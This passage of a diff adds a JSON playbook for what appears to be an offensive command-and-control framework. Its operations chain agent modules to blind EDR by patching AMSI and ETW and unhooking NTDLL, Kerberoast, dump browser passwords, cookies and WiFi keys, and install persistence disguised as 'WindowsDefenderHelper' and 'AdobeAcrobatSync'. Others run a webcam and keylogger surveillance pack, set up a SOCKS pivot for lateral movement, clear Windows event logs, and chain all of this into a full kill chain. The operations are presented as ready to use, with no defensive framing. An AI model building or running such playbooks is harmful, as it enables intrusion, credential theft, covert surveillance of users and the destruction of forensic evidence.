+          "action_description": "Kerberos tickets cache dump"
+        }
+      ]
+    },
+    {
+      "id": "op_edr_blind",
+      "name": "OP EDR BLIND — AMSI + ETW + NTDLL Unhook",
+      "description": "Aveugle total des detections EDR: patch AMSI (scripts PS non detectes), patch ETW (telemetrie supprimee), unhook NTDLL (hooks userland retires). Apres cette operation, l'agent peut operer librement sans alerte EDR. T1562.001 + T1562.002.",
+      "icon": "🦇",
+      "category": "evasion",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1562.001",
+        "T1562.002",
+        "T1027"
+      ],
+      "tags": [
+        "edr",
+        "amsi",
+        "etw",
+        "ntdll",
+        "unhook",
+        "bypass",
+        "stealth"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Pre-Bypass Status",
+          "steps": [
+            1
+          ]
+        },
+        {
+          "label": "Phase 2 — AMSI Patch",
+          "steps": [
+            2
+          ]
+        },
+        {
+          "label": "Phase 3 — ETW Patch",
+          "steps": [
+            3
+          ]
+        },
+        {
+          "label": "Phase 4 — NTDLL Unhook",
+          "steps": [
+            4
+          ]
+        },
+        {
+          "label": "Phase 5 — Verification",
+          "steps": [
+            5
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "edr_evasion",
+          "action": "status",
+          "params": {},
+          "delay": 0,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "EDR status before bypass"
+        },
+        {
+          "order": 2,
+          "module": "edr_evasion",
+          "action": "patch_amsi",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Patch AMSI — PS scripts undetected"
+        },
+        {
+          "order": 3,
+          "module": "edr_evasion",
+          "action": "patch_etw",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Patch ETW — telemetry killed"
+        },
+        {
+          "order": 4,
+          "module": "edr_evasion",
+          "action": "unhook_ntdll",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Unhook NTDLL — restore clean syscalls"
+        },
+        {
+          "order": 5,
+          "module": "edr_evasion",
+          "action": "status",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Verify all patches active"
+        }
+      ]
+    },
+    {
+      "id": "op_ghost_mode",
+      "name": "OP GHOST MODE — Full Stealth Activation",
+      "description": "Active toutes les couches de furtivite: sleep mask (chiffrement memoire), stack spoofing (pile cachee), direct syscalls (bypass userland hooks), et mode stealth adaptatif. L'agent devient invisible aux scanners memoire et EDR. T1027 + T1497.001.",
+      "icon": "👻",
+      "category": "evasion",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1027",
+        "T1497.001",
+        "T1106",
+        "T1562"
+      ],
+      "tags": [
+        "stealth",
+        "sleep-mask",
+        "stack-spoof",
+        "syscalls",
+        "memory",
+        "ghost"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Status Check",
+          "steps": [
+            1,
+            2,
+            3
+          ]
+        },
+        {
+          "label": "Phase 2 — Activate Layers",
+          "steps": [
+            4,
+            5,
+            6
+          ]
+        },
+        {
+          "label": "Phase 3 — Stealth Mode",
+          "steps": [
+            7
+          ]
+        },
+        {
+          "label": "Phase 4 — Verification",
+          "steps": [
+            8
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "sleep_mask",
+          "action": "status",
+          "params": {},
+          "delay": 0,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Sleep mask status"
+        },
+        {
+          "order": 2,
+          "module": "stack_spoof",
+          "action": "status",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Stack spoof status"
+        },
+        {
+          "order": 3,
+          "module": "syscalls",
+          "action": "list",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Direct syscalls availability"
+        },
+        {
+          "order": 4,
+          "module": "sleep_mask",
+          "action": "enable",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Enable sleep mask — encrypt memory on sleep"
+        },
+        {
+          "order": 5,
+          "module": "stack_spoof",
+          "action": "spoof",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Enable stack spoofing — hide call stack"
+        },
+        {
+          "order": 6,
+          "module": "syscalls",
+          "action": "check",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Verify direct syscalls integrity"
+        },
+        {
+          "order": 7,
+          "module": "stealth",
+          "action": "indicators",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Check stealth indicators"
+        },
+        {
+          "order": 8,
+          "module": "sleep_mask",
+          "action": "status",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Final verification — all layers active"
+        }
+      ]
+    },
+    {
+      "id": "op_token_abuse",
+      "name": "OP TOKEN ABUSE — Privilege Escalation via Tokens",
+      "description": "Enumere le token courant, les privileges, et le SID. Identifie les vecteurs d'escalation: SeDebugPrivilege (LSASS access), SeImpersonatePrivilege (potato attacks), SeAssignPrimaryToken (juicy potato). Preparation pour impersonation et privesc. T1134.001 + T1134.002.",
+      "icon": "🎭",
+      "category": "lateral",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1134.001",
+        "T1134.002",
+        "T1055"
+      ],
+      "tags": [
+        "token",
+        "impersonation",
+        "privesc",
+        "privileges",
+        "sebug",
+        "impersonate",
+        "potato"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Token Identity",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — Privilege Enum",
+          "steps": [
+            3
+          ]
+        },
+        {
+          "label": "Phase 3 — Process Recon",
+          "steps": [
+            4
+          ]
+        },
+        {
+          "label": "Phase 4 — UAC Check",
+          "steps": [
+            5
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "token",
+          "action": "get_uid",
+          "params": {},
+          "delay": 0,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Get current token identity (username + SID)"
+        },
+        {
+          "order": 2,
+          "module": "token",
+          "action": "get_privileges",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Enumerate all privileges — find SeDebug/SeImpersonate"
+        },
+        {
+          "order": 3,
+          "module": "injection",
+          "action": "list_processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "List processes for injection/migration targets"
+        },
+        {
+          "order": 4,
+          "module": "uac_bypass",
+          "action": "check_uac",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Check UAC level — bypass possible?"
+        },
+        {
+          "order": 5,
+          "module": "stealth",
+          "action": "indicators",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Check user activity status"
+        }
+      ]
+    },
+    {
+      "id": "op_kerberoast_blitz",
+      "name": "OP KERBEROAST BLITZ — AD Ticket Extraction",
+      "description": "Attaque Kerberoast complete: enumeration des comptes service avec SPN, extraction des TGS, et dump des tickets Kerberos en cache. Les hashes TGS sont crackes offline avec hashcat. T1558.003.",
+      "icon": "🔥",
+      "category": "credentials",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1558.003",
+        "T1003.006"
+      ],
+      "tags": [
+        "kerberoast",
+        "kerberos",
+        "tgs",
+        "spn",
+        "ad",
+        "hashcat",
+        "crack"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — AD Recon",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — Kerberoast",
+          "steps": [
+            3
+          ]
+        },
+        {
+          "label": "Phase 3 — Ticket Cache",
+          "steps": [
+            4
+          ]
+        },
+        {
+          "label": "Phase 4 — PTH Prep",
+          "steps": [
+            5
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "builtin",
+          "action": "domain_users",
+          "params": {},
+          "delay": 0,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Enumerate AD domain users"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "domain_admins",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Find domain admin accounts"
+        },
+        {
+          "order": 3,
+          "module": "kerberoast",
+          "action": "kerberoast",
+          "params": {
+            "domain": "local"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Kerberoast — extract TGS for SPN accounts"
+        },
+        {
+          "order": 4,
+          "module": "credential_dump",
+          "action": "kerberos",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Dump cached Kerberos tickets"
+        },
+        {
+          "order": 5,
+          "module": "pth",
+          "action": "dump_tickets",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "PTH ticket dump for lateral movement"
+        }
+      ]
+    },
+    {
+      "id": "op_lateral_chain",
+      "name": "OP LATERAL CHAIN — Movement Prep & Exec",
+      "description": "Preparation complete au mouvement lateral: enumeration des shares, sessions, et cibles reseau. Identification des credentials reutilisables. Setup du pivot SOCKS pour acceder au sous-reseau. T1021 + T1077 + T1090.",
+      "icon": "🔗",
+      "category": "lateral",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1021",
+        "T1077",
+        "T1090",
+        "T1057"
+      ],
+      "tags": [
+        "lateral",
+        "shares",
+        "sessions",
+        "psexec",
+        "wmi",
+        "winrm",
+        "socks",
+        "pivot"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Local Recon",
+          "steps": [
+            1,
+            2,
+            3
+          ]
+        },
+        {
+          "label": "Phase 2 — Network Discovery",
+          "steps": [
+            4,
+            5
+          ]
+        },
+        {
+          "label": "Phase 3 — Pivot Setup",
+          "steps": [
+            6
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "lateral",
+          "action": "enumerate_shares",
+          "params": {
+            "host": "127.0.0.1"
+          },
+          "delay": 0,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Enumerate local shares — C$, IPC$, ADMIN$"
+        },
+        {
+          "order": 2,
+          "module": "lateral",
+          "action": "enumerate_sessions",
+          "params": {
+            "host": "127.0.0.1"
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Enumerate active network sessions"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "shares",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Detailed share info via Windows API"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "netstat",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "List all network connections — find lateral targets"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "arp",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "ARP table — discover neighbors"
+        },
+        {
+          "order": 6,
+          "module": "pivoting",
+          "action": "start",
+          "params": {
+            "port": 1080
+          },
+          "delay": 3,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Start SOCKS pivot on port 1080"
+        }
+      ]
+    },
+    {
+      "id": "op_persistence_triple",
+      "name": "OP PERSISTENCE TRIPLE — Redundant Survival",
+      "description": "Installe 3 mecanismes de persistance redondants: Registry Run, Scheduled Task, et COM Hijack. Si un est detecte et supprime, les autres survivent. Verification post-install. T1547 + T1053 + T1546.",
+      "icon": "⚓",
+      "category": "persistence",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1547.001",
+        "T1053.005",
+        "T1546.001"
+      ],
+      "tags": [
+        "persistence",
+        "registry",
+        "scheduled-task",
+        "com-hijack",
+        "redundant",
+        "survive"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Check Existing",
+          "steps": [
+            1
+          ]
+        },
+        {
+          "label": "Phase 2 — Install Triple",
+          "steps": [
+            2,
+            3,
+            4
+          ]
+        },
+        {
+          "label": "Phase 3 — Verify",
+          "steps": [
+            5,
+            6
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "persistence",
+          "action": "check",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Check existing persistence mechanisms"
+        },
+        {
+          "order": 2,
+          "module": "persistence",
+          "action": "install",
+          "params": {
+            "method": "registry",
+            "name": "WindowsDefenderHelper"
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Install Registry Run persistence"
+        },
+        {
+          "order": 3,
+          "module": "persistence",
+          "action": "install",
+          "params": {
+            "method": "scheduled_task",
+            "name": "AdobeAcrobatSync"
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Install Scheduled Task persistence"
+        },
+        {
+          "order": 4,
+          "module": "persistence_adv",
+          "action": "install",
+          "params": {
+            "method": "com_hijack"
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Install COM Hijack persistence"
+        },
+        {
+          "order": 5,
+          "module": "persistence",
+          "action": "check",
+          "params": {},
+          "delay": 3,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Verify all persistence mechanisms active"
+        },
+        {
+          "order": 6,
+          "module": "persistence_adv",
+          "action": "list_persistence",
+          "params": {},
+          "delay": 1,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "List all persistence entries"
+        }
+      ]
+    },
+    {
+      "id": "op_inject_migrate",
+      "name": "OP INJECT MIGRATE — Process Injection & Migration",
+      "description": "Reconnaissance processus pour injection, identification des cibles (explorer.exe, svchost.exe), et preparation a la migration. L'agent peut ensuite s'injecter dans un processus legit pour eviter la detection. T1055.",
+      "icon": "💉",
+      "category": "lateral",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1055.001",
+        "T1055.002"
+      ],
+      "tags": [
+        "injection",
+        "migration",
+        "dll",
+        "shellcode",
+        "process",
+        "hollowing",
+        "stealth"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Process Recon",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — Target Selection",
+          "steps": [
+            3
+          ]
+        },
+        {
+          "label": "Phase 3 — Stealth Check",
+          "steps": [
+            4
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "injection",
+          "action": "list_processes",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "List all processes with PID, arch, session"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Detailed process list with services"
+        },
+        {
+          "order": 3,
+          "module": "process",
+          "action": "list",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Process tree — parents and children"
+        },
+        {
+          "order": 4,
+          "module": "stealth",
+          "action": "indicators",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Check stealth — user active? screen locked?"
+        }
+      ]
+    },
+    {
+      "id": "op_wifi_wardrive",
+      "name": "OP WIFI WARDRIVE — Full WiFi Assessment",
+      "description": "Audit WiFi complet: statut adaptateur, scan des reseaux visibles (BSSID, signal, securite), profils sauvegardes, et extraction des cles WPA/WPA2. Permet de cartographier l'environnement wireless et recuperer les mots de passe WiFi. T1555.004.",
+      "icon": "📡",
+      "category": "credentials",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1555.004",
+        "T1016"
+      ],
+      "tags": [
+        "wifi",
+        "wardrive",
+        "wpa",
+        "wpa2",
+        "wireless",
+        "ssid",
+        "bssid",
+        "credentials"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Adapter Status",
+          "steps": [
+            1
+          ]
+        },
+        {
+          "label": "Phase 2 — Network Scan",
+          "steps": [
+            2
+          ]
+        },
+        {
+          "label": "Phase 3 — Saved Profiles",
+          "steps": [
+            3
+          ]
+        },
+        {
+          "label": "Phase 4 — Credential Extraction",
+          "steps": [
+            4
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "wifi",
+          "action": "status",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "WiFi adapter status — connected? SSID?"
+        },
+        {
+          "order": 2,
+          "module": "wifi",
+          "action": "scan",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Scan visible networks — BSSID, signal, security"
+        },
+        {
+          "order": 3,
+          "module": "wifi",
+          "action": "profiles",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "List saved WiFi profiles — connection history"
+        },
+        {
+          "order": 4,
+          "module": "wifi",
+          "action": "credentials",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Extract all WPA/WPA2 keys"
+        }
+      ]
+    },
+    {
+      "id": "op_browser_rip",
+      "name": "OP BROWSER RIP — Total Browser Compromise",
+      "description": "Compromission totale des navigateurs: passwords sauvegardes (Chrome/Firefox/Edge), cookies de session (hijack), historique de navigation, et autofill. Combine avec DPAPI pour decrypter les cles. T1555.003.",
+      "icon": "🌐",
+      "category": "credentials",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1555.003",
+        "T1539",
+        "T1555.004"
+      ],
+      "tags": [
+        "browser",
+        "chrome",
+        "firefox",
+        "edge",
+        "passwords",
+        "cookies",
+        "history",
+        "session-hijack"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — DPAPI Keys",
+          "steps": [
+            1
+          ]
+        },
+        {
+          "label": "Phase 2 — Passwords",
+          "steps": [
+            2
+          ]
+        },
+        {
+          "label": "Phase 3 — Cookies & Sessions",
+          "steps": [
+            3
+          ]
+        },
+        {
+          "label": "Phase 4 — History & Autofill",
+          "steps": [
+            4,
+            5
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "credential_dump",
+          "action": "dpapi",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Extract DPAPI master keys for browser decrypt"
+        },
+        {
+          "order": 2,
+          "module": "browser",
+          "action": "passwords",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge"
+            ],
+            "limit": 1000
+          },
+          "delay": 3,
+          "timeout": 60,
+          "priority": "critical",
+          "action_description": "Extract all saved browser passwords"
+        },
+        {
+          "order": 3,
+          "module": "browser",
+          "action": "cookies",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge"
+            ]
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Extract session cookies for hijack"
+        },
+        {
+          "order": 4,
+          "module": "browser",
+          "action": "history",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge"
+            ],
+            "limit": 500
+          },
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Extract browsing history — portals, webmails"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "credential_manager",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Windows Credential Manager — RDP, SMB, web auth"
+        }
+      ]
+    },
+    {
+      "id": "op_surveillance_pack",
+      "name": "OP SURVEILLANCE PACK — Watch & Record",
+      "description": "Package de surveillance complet: screenshot, webcam, keylogger 2min, clipboard monitor, et stealth indicators. Capture l'activite de l'utilisateur en temps reel. Idéal pour intercepter une session de travail. T1113 + T1119 + T1056.",
+      "icon": "📹",
+      "category": "surveillance",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1113",
+        "T1119",
+        "T1056.001",
+        "T1115"
+      ],
+      "tags": [
+        "surveillance",
+        "screenshot",
+        "webcam",
+        "keylog",
+        "clipboard",
+        "monitor",
+        "watch"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Visual Capture",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — Input Capture",
+          "steps": [
+            3
+          ]
+        },
+        {
+          "label": "Phase 3 — Clipboard",
+          "steps": [
+            4,
+            5
+          ]
+        },
+        {
+          "label": "Phase 4 — Status",
+          "steps": [
+            6
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "quality": 85
+          },
+          "delay": 0,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Capture screenshot — see what user sees"
+        },
+        {
+          "order": 2,
+          "module": "webcam",
+          "action": "capture",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Capture webcam — who is at the machine?"
+        },
+        {
+          "order": 3,
+          "module": "keylog",
+          "action": "start",
+          "params": {
+            "duration": 120,
+            "flush_interval": 30
+          },
+          "delay": 3,
+          "timeout": 130,
+          "priority": "critical",
+          "action_description": "Start keylogger for 2 minutes"
+        },
+        {
+          "order": 4,
+          "module": "clipboard",
+          "action": "capture",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Capture current clipboard content"
+        },
+        {
+          "order": 5,
+          "module": "clipboard",
+          "action": "monitor",
+          "params": {
+            "duration": 30
+          },
+          "delay": 1,
+          "timeout": 35,
+          "priority": "high",
+          "action_description": "Monitor clipboard for 30 seconds"
+        },
+        {
+          "order": 6,
+          "module": "stealth",
+          "action": "indicators",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Check user activity — idle? active? locked?"
+        }
+      ]
+    },
+    {
+      "id": "op_anti_forensics",
+      "name": "OP ANTI-FORENSICS — Full Trace Cleanup",
+      "description": "Nettoyage complet des traces: effacement des logs Windows (Security, System, Application, PowerShell), wipe de l'historique, suppression des traces temp, prefetch, et thumbcache. L'agent devient invisible post-operation. T1070 + T1562.002.",
+      "icon": "🧹",
+      "category": "evasion",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1070.001",
+        "T1070.002",
+        "T1562.002"
+      ],
+      "tags": [
+        "anti-forensics",
+        "clear-logs",
+        "wipe",
+        "cleanup",
+        "stealth",
+        "opsec"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Log Cleanup",
+          "steps": [
+            1
+          ]
+        },
+        {
+          "label": "Phase 2 — History Wipe",
+          "steps": [
+            2
+          ]
+        },
+        {
+          "label": "Phase 3 — Trace Removal",
+          "steps": [
+            3
+          ]
+        },
+        {
+          "label": "Phase 4 — Verification",
+          "steps": [
+            4
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security",
+              "System",
+              "Application",
+              "PowerShell"
+            ]
+          },
+          "delay": 0,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Clear all Windows event logs"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "clear_history",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Clear shell history"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "wipe_traces",
+          "params": {
+            "temp": true,
+            "prefetch": true,
+            "thumbcache": true
+          },
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Wipe temp files, prefetch, thumbcache"
+        },
+        {
+          "order": 4,
+          "module": "stealth",
+          "action": "indicators",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Verify clean state"
+        }
+      ]
+    },
+    {
+      "id": "op_subnet_sweep",
+      "name": "OP SUBNET SWEEP — Network Discovery Blitz",
+      "description": "Decouverte reseau rapide: scan du sous-reseau, enumeration ARP, netstat pour connexions actives, et port scan sur les hotes trouves. Cartographie tout l'environnement network en une operation. T1046 + T1018.",
+      "icon": "🛰",
+      "category": "recon",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1046",
+        "T1018",
+        "T1016"
+      ],
+      "tags": [
+        "network",
+        "subnet",
+        "scan",
+        "arp",
+        "netstat",
+        "discovery",
+        "recon"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Local Network",
+          "steps": [
+            1,
+            2,
+            3
+          ]
+        },
+        {
+          "label": "Phase 2 — Subnet Scan",
+          "steps": [
+            4
+          ]
+        },
+        {
+          "label": "Phase 3 — Connection Map",
+          "steps": [
+            5
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Network interfaces, DNS, gateway, DHCP"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "arp",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "ARP table — discover neighbors"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "routes",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Routing table — network topology"
+        },
+        {
+          "order": 4,
+          "module": "port_scan",
+          "action": "subnet",
+          "params": {
+            "cidr": "192.168.18.0/24",
+            "ports": [
+              22,
+              80,
+              135,
+              139,
+              443,
+              445,
+              3389,
+              5985
+            ],
+            "timeout": 1
+          },
+          "delay": 3,
+          "timeout": 120,
+          "priority": "critical",
+          "action_description": "Scan subnet for live hosts and open ports"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "netstat",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Active connections — who talks to whom"
+        }
+      ]
+    },
+    {
+      "id": "op_full_compromise",
+      "name": "OP FULL COMPROMISE — End-to-End Attack Chain",
+      "description": "Chaine d'attaque complete end-to-end: recon -> credential dump -> EDR bypass -> persistance -> lateral recon -> exfil -> anti-forensics. 15 etapes couvrant tout le kill chain MITRE ATT&CK. L'operation offensive ultime.",
+      "icon": "💀",
+      "category": "full",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1082",
+        "T1003",
+        "T1562",
+        "T1547",
+        "T1021",
+        "T1070"
+      ],
+      "tags": [
+        "full",
+        "kill-chain",
+        "end-to-end",
+        "apt",
+        "complete",
+        "offensive"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Recon",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — Credentials",
+          "steps": [
+            3,
+            4,
+            5
+          ]
+        },
+        {
+          "label": "Phase 3 — Evasion",
+          "steps": [
+            6
+          ]
+        },
+        {
+          "label": "Phase 4 — Persistence",
+          "steps": [
+            7
+          ]
+        },
+        {
+          "label": "Phase 5 — Lateral Recon",
+          "steps": [
+            8,
+            9
+          ]
+        },
+        {
+          "label": "Phase 6 — Surveillance",
+          "steps": [
+            10
+          ]
+        },
+        {
+          "label": "Phase 7 — Cleanup",
+          "steps": [
+            11
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "System info — OS, hostname, IP, user"
+        },
+        {
+          "order": 2,
+          "module": "token",
+          "action": "get_privileges",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Enumerate privileges — privesc vectors"
+        },
+        {
+          "order": 3,
+          "module": "credential_dump",
+          "action": "dpapi",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "DPAPI master keys — decrypt browser creds"
+        },
+        {
+          "order": 4,
+          "module": "credential_dump",
+          "action": "kerberos",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Kerberos tickets — PTT prep"
+        },
+        {
+          "order": 5,
+          "module": "browser",
+          "action": "passwords",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge"
+            ],
+            "limit": 500
+          },
+          "delay": 3,
+          "timeout": 60,
+          "priority": "critical",
+          "action_description": "Browser passwords extraction"
+        },
+        {
+          "order": 6,
+          "module": "edr_evasion",
+          "action": "patch_amsi",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Patch AMSI — blind PS detection"
+        },
+        {
+          "order": 7,
+          "module": "persistence",
+          "action": "install",
+          "params": {
+            "method": "registry",
+            "name": "WindowsDefenderHelper"
+          },
+          "delay": 3,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Install persistence — survive reboot"
+        },
+        {
+          "order": 8,
+          "module": "lateral",
+          "action": "enumerate_shares",
+          "params": {
+            "host": "127.0.0.1"
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Enumerate shares — lateral targets"
+        },
+        {
+          "order": 9,
+          "module": "injection",
+          "action": "list_processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
